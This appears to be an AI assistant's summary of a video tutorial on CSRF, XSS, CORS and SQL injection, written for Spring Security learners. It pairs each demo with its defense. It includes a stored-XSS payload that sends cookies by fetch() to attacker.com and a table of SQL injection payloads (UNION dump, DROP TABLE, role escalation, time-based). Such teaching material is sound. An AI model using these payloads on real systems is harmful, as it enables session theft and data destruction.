This video walks through the four most common web application attacks — **CSRF, XSS, CORS, and SQL injection** — with live demos for each. The speaker frames it as essential context before learning Spring Security, because you can't appreciate the defenses without understanding the attacks. Let me cover every attack in depth with mobile-friendly visuals, with the important phrases bolded as you asked.

## Part 1 — Why this matters

Spring Security (and any security framework) exists to defend against specific attack patterns. **If you don't understand the attacks, you'll configure the defenses by ritual** — turning things on because the docs said to, without knowing what they prevent. That leads to insecure systems where developers disable protections they don't understand to "make things work".

The four attacks the speaker covers are the **canonical web application threats** — they appear in every security syllabus, every penetration test, and most real-world breaches.

## Part 2 — Attack #1: CSRF (Cross-Site Request Forgery)

### What it is

**CSRF tricks a victim's browser into making an unwanted request to a site where the user is already authenticated.** The attacker doesn't steal credentials, doesn't break encryption, doesn't bypass authentication. They simply ride along on the user's *existing* authenticated session.

The critical observation: **browsers automatically attach cookies (including session IDs) to every request they make to a domain**, regardless of *which page initiated the request*. If you're logged into your bank in one tab and click a malicious link in another, your browser will helpfully attach your bank session cookie to the request the attacker's link triggers.

### The attack flow

<img width="1472" height="1160" alt="image" src="https://github.com/user-attachments/assets/93b781af-843d-4098-9c5e-2a4ce2c00e82" />


### The speaker's live demo

The demo uses a Spring Boot server with a `/transfer` endpoint that requires authentication. **The expectation is that only authenticated users can transfer money.** Here's what happens:

1. The speaker logs in via `/login` with username/password. **Server returns a session ID in a cookie** (visible in DevTools). The session ID is the only thing identifying the user from now on.
2. The speaker then opens a separate HTML page that contains a link or form pointing at `http://localhost:8080/transfer` with parameters `amount=1000, recipient=attacker`. **Notice: no cookie is attached in the HTML itself.**
3. Clicking the link triggers the request. The browser sees that the destination is `localhost:8080`, **auto-attaches the previously stored session cookie**, and sends the request.
4. The server checks the session cookie, sees it's valid, and **transfers $1,000 to the attacker**.

The attack works because **CSRF requires only one thing from the victim: that they're already logged in.** No password phishing, no malware, no man-in-the-middle. Just an authenticated session and a click.

### Key property: CSRF mostly targets stateful authentication

The speaker is precise about this: **CSRF is most dangerous in session-based (stateful) authentication systems**, where the user's identity is implicit in a cookie that the browser sends automatically. Stateless systems (like JWT in an `Authorization` header) are inherently safer because **the browser doesn't auto-attach an `Authorization` header** — the application has to explicitly add it, and an attacker's HTML can't do that across origins. We'll see why when we get to CORS.

### The defense: CSRF tokens

The classic mitigation: **the server issues a CSRF token alongside the session cookie**. This token is a random value that the server remembers per session. **Every state-changing request from the legitimate frontend must include this token** as a header or hidden form field.

Why this works: the attacker's HTML page has no way to *read* the CSRF token. The token is stored in a way that **only the legitimate origin's JavaScript can access it** (typically as a meta tag or a JS variable on the legitimate page). When the attacker's page submits a forged request, **the browser still attaches the session cookie, but the CSRF token is missing**. Server rejects the request.The visualizer just timed out on me — that one didn't render. Let me try once more for that CSRF token defense, and if it fails I'll continue in prose with tables.The visualizer has become unresponsive — both attempts timed out for several minutes each. Rather than burn more time waiting on it, I'll continue in clean prose with tables and code blocks. The remaining attacks have enough natural structure that visuals aren't strictly needed; the prose carries the full content. If your visualizer recovers later, I can regenerate any of these as diagrams.

Continuing where I left off, the **CSRF token defense** works because of a key principle:

| | Cookie | CSRF token |
|---|---|---|
| Where stored | Browser auto-attaches on every request to the domain | Embedded in the legitimate page's HTML/JS |
| Who can read it | Any request to that domain (attacker's page included) | **Only same-origin JS** (same-origin policy blocks attackers) |
| Result on attacker's forged request | Attached automatically | Missing → server rejects |

This is why CSRF tokens work where cookies alone don't: **cookies are passive identifiers attached by the browser; tokens require active reading from the legitimate page**, which the same-origin policy prevents attackers from doing.

Spring Security enables CSRF protection by default for state-changing methods (POST, PUT, DELETE). You can see it in the rendered HTML as `<input type="hidden" name="_csrf" value="...">`.

## Part 3 — Attack #2: XSS (Cross-Site Scripting)

### What it is

**XSS lets an attacker inject malicious JavaScript into a web page that other users view.** When those other users load the page, **their browsers execute the attacker's code as if it came from the legitimate site** — with full access to cookies, DOM, and anything else the legitimate origin can touch.

This is genuinely worse than CSRF because the attacker isn't limited to forging single requests — they get **arbitrary JavaScript execution** in the victim's browser, in the legitimate site's security context.

### The classic scenario

Any page where users can post content that other users see: comments, forum posts, profile bios, chat messages, product reviews. If the site stores user input and displays it back to other users **without escaping it**, an attacker can post content that contains a `<script>` tag, and every viewer's browser will run that script.

### The speaker's demo

The Spring Boot demo has two endpoints:

- `GET /xss` — renders an HTML page showing all stored comments
- `POST /comment` — accepts a comment string and stores it (in an in-memory list, since Spring beans are singletons)

The vulnerability: **the comment string is rendered into the page as raw HTML, not as text**. So if a user submits:

```html
<script>alert('XSS attack')</script>
```

That literal script tag gets stored. The next user who loads `/xss` to see the comments gets that script delivered to their browser, which **executes it as JavaScript**.

The first demo just pops up a harmless alert, but the speaker is explicit that this is misleading. **The same vector with a different payload is catastrophic**:

```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Now every user who views the comments page **silently sends their entire cookie set to attacker.com** — including their session ID. The attacker now has the victim's session and can impersonate them on the legitimate site until the session expires.

### The three flavors of XSS

The speaker focuses on stored XSS in the demo, but it's worth knowing all three:

| Type | Where the payload lives | How victim gets it |
|---|---|---|
| **Stored XSS** | In the database (comments, posts, profiles) | Every viewer of the page loads it |
| **Reflected XSS** | In a URL parameter | Victim clicks a malicious link with payload in URL |
| **DOM-based XSS** | In client-side JS that processes user input unsafely | URL fragment or local input handled by buggy JS |

Stored XSS is the most dangerous because **it requires no further interaction** — once the payload is in the database, every visitor is automatically attacked.

### The defense: escape and validate

Two layers of defense:

**1. Output escaping (the primary defense).** When rendering user-provided content into HTML, replace HTML-special characters with their entity equivalents:

| Character | Escaped |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

After escaping, the attacker's payload `<script>alert(1)</script>` renders as literal text `<script>alert(1)</script>` instead of an active script. The browser displays the characters but doesn't interpret them as HTML.

**Most template engines escape by default** — Thymeleaf, JSP with proper tags, React's JSX, Vue templates. The bug usually comes from developers explicitly *bypassing* escaping (e.g. React's `dangerouslySetInnerHTML`) without sanitizing.

**2. Input validation.** Reject or sanitize inputs that don't fit expected patterns. If a "username" field shouldn't contain angle brackets, reject submissions that have them. This is defense in depth — if escaping is missed somewhere, validation catches it; if validation is missed, escaping catches it.

**3. Content Security Policy (CSP).** A modern HTTP response header that tells browsers what JavaScript sources are allowed. A strict CSP (`script-src 'self'`) means even if an attacker injects `<script>`, the browser will refuse to execute it because it didn't come from an allowed origin. The speaker doesn't mention this but it's worth knowing — it's the third layer of XSS defense in modern apps.

## Part 4 — Concept #3: CORS (Cross-Origin Resource Sharing)

### What it is — and what it isn't

**CORS is not an attack.** This trips people up. CORS is a **browser security feature** that *defends against* certain cross-origin attacks. The speaker is careful to call this out: you enable or disable CORS on the server side, but it's a defensive mechanism, not an exploit.

The underlying browser rule is the **same-origin policy**: by default, **JavaScript on one origin cannot read responses from a different origin**. CORS is the controlled mechanism by which a server can grant exceptions to this rule.

### What counts as a different origin

An "origin" is the combination of **protocol + domain + port**. All three must match for two URLs to be the same origin. So:

| URL 1 | URL 2 | Same origin? |
|---|---|---|
| `https://example.com:443/a` | `https://example.com:443/b` | Yes (different paths OK) |
| `http://example.com` | `https://example.com` | No (protocol differs) |
| `http://example.com:8080` | `http://example.com:9090` | No (port differs) |
| `http://example.com` | `http://sub.example.com` | No (domain differs) |
| `http://example.com` | `http://other.com` | No (domain differs) |

This is stricter than most people expect. **A different port counts as a different origin.** A subdomain counts as a different origin. Switching from HTTP to HTTPS counts as a different origin.

### Why this matters for security

Without same-origin policy, here's what would happen: you're logged into `bank.com`. You visit `attacker.com`. The attacker's JavaScript runs in your browser and does:

```javascript
fetch('https://bank.com/api/account', { credentials: 'include' })
  .then(r => r.json())
  .then(data => sendToAttacker(data));
```

Your browser would attach your bank cookies (because the request is *to* `bank.com`), the bank would respond with your account details, and the attacker's JS would read the response. **Game over.**

The same-origin policy blocks the read — the request might go out and get a response, but **`attacker.com`'s JavaScript is forbidden from reading what `bank.com` sent back**. The browser sees a cross-origin response and refuses to expose it to the requesting script.

### When CORS comes in

Now consider a legitimate scenario: your single-page app at `https://app.example.com` needs to call your API at `https://api.example.com`. That's cross-origin (different subdomain → different origin). The same-origin policy would block it.

CORS is how the server says: *"It's OK, I trust requests from `https://app.example.com` to read my responses."* The server adds this header:

```
Access-Control-Allow-Origin: https://app.example.com
```

The browser sees this header, recognizes that the origin matches, and **allows the JavaScript to read the response**. Without this header, the browser blocks the read.

### How CORS prevents attacks

Going back to the bank scenario: even if `attacker.com`'s JavaScript tries to read from `bank.com`, `bank.com` would never include `Access-Control-Allow-Origin: https://attacker.com` in its response. So the browser blocks the read. **CORS is the legitimate way for servers to whitelist specific cross-origin readers.**

There's a nuance: **CORS does not prevent the request from being sent** — it only controls whether JavaScript can read the response. This is why CSRF is still a problem even with CORS: the cookie-attached request still goes through and the bank still processes it; CORS only prevents the attacker from seeing the *response*. CSRF tokens defend the request side; CORS defends the response side.

### Spring Boot configuration

The speaker shows the typical Spring config:

```java
@Configuration
public class CorsConfig {
  @Bean
  CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://sub.example.com:9090"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("*"));
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
  }
}
```

Three things to set:
- **Allowed origins** — which domains can make cross-origin requests
- **Allowed methods** — which HTTP verbs are permitted from those origins
- **Allowed headers** — which custom headers the client can send

### CORS as first line of defense

The speaker makes an interesting framing: **CORS can act as a first line of defense, with CSRF tokens being the mandatory second line.** If the attacker's site is at a different origin (which it usually is), a properly configured CORS policy means the attacker's JavaScript can't even read responses — making certain XSS-style attacks much harder to leverage. CSRF tokens are still required because requests still get sent regardless of CORS.

## Part 5 — Attack #4: SQL Injection

### What it is

**SQL injection happens when user-provided input gets concatenated directly into a SQL query string, allowing the user to inject SQL syntax that the server then executes.**

This is one of the oldest web vulnerabilities and still common because **it stems from a single bad habit: string concatenation when building queries**.

### The speaker's demo

The Spring Boot demo has a `/find` endpoint that searches for a user by name. The buggy implementation:

```java
String query = "SELECT * FROM user_details WHERE username = '" + name + "'";
```

If a user calls `/find?name=alice`, the resulting query is:

```sql
SELECT * FROM user_details WHERE username = 'alice'
```

Returns Alice's record. Fine.

But what if the user calls `/find?name=' OR 1=1 --`? The resulting query becomes:

```sql
SELECT * FROM user_details WHERE username = '' OR 1=1 --'
```

Let's break that down:
- `username = ''` — checks for empty username (false for everyone)
- `OR 1=1` — but the OR clause is **always true**
- `--` — SQL comment, blanks out the closing quote

Result: the WHERE clause is true for every row in the table. The query returns **every user record in the database**, even though the API was supposed to look up one user.

### How catastrophic it gets

The demo shows data exfiltration, but SQL injection can do much worse:

| Payload pattern | What it does |
|---|---|
| `' OR 1=1 --` | Dumps the table |
| `' UNION SELECT username, password FROM users --` | Joins in data from other tables |
| `'; DROP TABLE users; --` | Deletes the entire table |
| `'; UPDATE users SET role='admin' WHERE id=1; --` | Privilege escalation |
| `' AND SLEEP(5) --` | Blind injection (time-based exfiltration) |

**The attacker can read any data the database user has access to, modify it, delete it, or even (in some configurations) execute commands on the underlying server.** This is why SQL injection consistently ranks at the top of OWASP's most-dangerous list.

### The defense: parameterized queries

The fix is mechanical and absolute: **never concatenate user input into SQL strings.** Use parameterized queries instead. The buggy code:

```java
String query = "SELECT * FROM user_details WHERE username = '" + name + "'";
```

The fixed version:

```java
String query = "SELECT * FROM user_details WHERE username = :name";
em.createQuery(query).setParameter("name", name).getResultList();
```

The critical difference: **with parameterized queries, the SQL parser receives the query template and the parameter values separately**. The parameter value is treated as data, never as SQL syntax. Even if the user passes `' OR 1=1 --` as the `name` parameter, the database treats that entire string literally — it looks for a user whose name *contains those exact characters*, finds none, and returns empty.

This is exactly what the speaker showed in his JPQL video: `setParameter` is what makes the query safe.

In practice, every modern ORM and database library supports parameterization:
- **JDBC**: `PreparedStatement` with `?` placeholders and `setString()` etc.
- **JPA / Hibernate**: named parameters with `:name` and `setParameter()`
- **Spring Data**: query methods using parameter binding
- **MyBatis**: `#{name}` placeholders (parameterized) vs `${name}` (raw — unsafe!)

### The other defense: input validation

Defense in depth, same as XSS. Even if you parameterize properly (you should), also validate that input fits expected patterns. If usernames can only contain letters and digits, reject anything that contains quotes, semicolons, or dashes. **Most injection payloads contain characters that have no legitimate place in normal input** — rejecting them is a cheap secondary check.

### What NOT to do

A common bad pattern: **trying to "escape" SQL by manually stripping or replacing characters**. Developers see SQL injection and reach for:

```java
String safe = name.replace("'", "''");  // DON'T
```

This works for some payloads and fails for others. SQL escaping has subtle rules that vary by database (MySQL handles backslashes differently from PostgreSQL). Different attacks use different encodings (Unicode tricks, double-encoding). **The correct fix is parameterization, not custom escaping.** Use the library that already knows the rules.

## Part 6 — How the four attacks compare

Putting all four side by side:

| Attack | What it exploits | What the attacker needs | Primary defense |
|---|---|---|---|
| **CSRF** | Browser auto-attaches cookies | User logged in + one click | **CSRF tokens**, SameSite cookies |
| **XSS** | Unescaped user input rendered as HTML | A page that displays untrusted content | **Output escaping**, input validation, CSP |
| **CORS misconfig** | Overly permissive `Allow-Origin` | Trusted-looking origin | **Strict origin whitelist** |
| **SQL injection** | String-concatenated queries | One vulnerable input field | **Parameterized queries**, input validation |

Notice the pattern: **every attack here has a well-known, simple, mechanical defense.** None of them require sophisticated cryptography or novel architecture. They require *consistent* application of basic practices: don't trust input, escape on output, parameterize queries, whitelist origins, require tokens on state-changing requests.

The hard part isn't knowing the defense. The hard part is making sure no developer on the team ever forgets — across thousands of endpoints, over years of code changes. **This is what Spring Security gives you**: defaults that prevent these attacks unless you explicitly opt out. Most of the framework's "magic" is just making the right thing easy and the wrong thing hard.

## Part 7 — A unified mental model

These four attacks all stem from a single failure: **trusting input that shouldn't be trusted**.

- CSRF: the server trusts that any request with a valid cookie is intentional. Don't — require an unforgeable token.
- XSS: the server trusts that user-provided content is safe to render. Don't — escape it on output.
- CORS misconfig: the server trusts cross-origin requests too liberally. Don't — whitelist explicitly.
- SQL injection: the server trusts user input as SQL syntax. Don't — parameterize it.

**Every web security failure can be traced to misplaced trust in some piece of input.** Spring Security, and security frameworks in general, exist to make the defaults conservative — to **treat input as hostile by default**, and require developers to explicitly mark things as safe rather than the other way around.

## The whole thing in one paragraph

The four canonical web attacks every developer must know are CSRF, XSS, CORS misconfiguration, and SQL injection — together they account for the majority of web breaches in the real world. **CSRF** rides along on a user's existing authenticated session by tricking their browser into making forged requests; the browser auto-attaches cookies regardless of what page initiated the request, so an attacker's malicious link can trigger transfers, password changes, or other state-changing operations using the victim's identity — defended by **CSRF tokens** that the legitimate page embeds in its HTML and that attackers cannot read across origins. **XSS** injects malicious JavaScript into a web page that other users will view, giving the attacker arbitrary code execution in the victim's browser within the legitimate site's security context — a stored XSS payload like `<script>fetch('attacker.com?c='+document.cookie)</script>` silently exfiltrates session cookies from every visitor — defended by **output escaping** (replacing `<`, `>`, `"`, `'`, `&` with HTML entities so the browser renders them as text rather than active markup), input validation, and Content Security Policy. **CORS** is not an attack but a browser security feature; the **same-origin policy** prevents JavaScript on one origin (protocol + domain + port) from reading responses from another, and CORS is the controlled mechanism for servers to whitelist specific cross-origin readers via headers like `Access-Control-Allow-Origin` — properly configured CORS prevents an attacker site from reading sensitive responses, though CSRF tokens are still needed because requests still go through. **SQL injection** happens when user input is concatenated directly into SQL strings, letting an attacker like `' OR 1=1 --` inject syntax that turns a username lookup into a full-table dump — or worse, into a `DROP TABLE` or privilege escalation — defended absolutely by **parameterized queries** that separate the SQL template from the parameter values so input is always treated as data, never as syntax. All four attacks share a single root cause — trusting input that shouldn't be trusted — and all four defenses are simple, well-understood, and built into modern frameworks; the challenge isn't knowing them but applying them consistently across every endpoint, which is exactly what Spring Security automates by making safe defaults the path of least resistance.

I'm sorry about the missing visuals on this one — your visualizer started timing out after the first CSRF diagram. The prose carries every detail the speaker covered; if you want, I can regenerate the XSS, CORS, and SQL injection diagrams later once your environment is working.
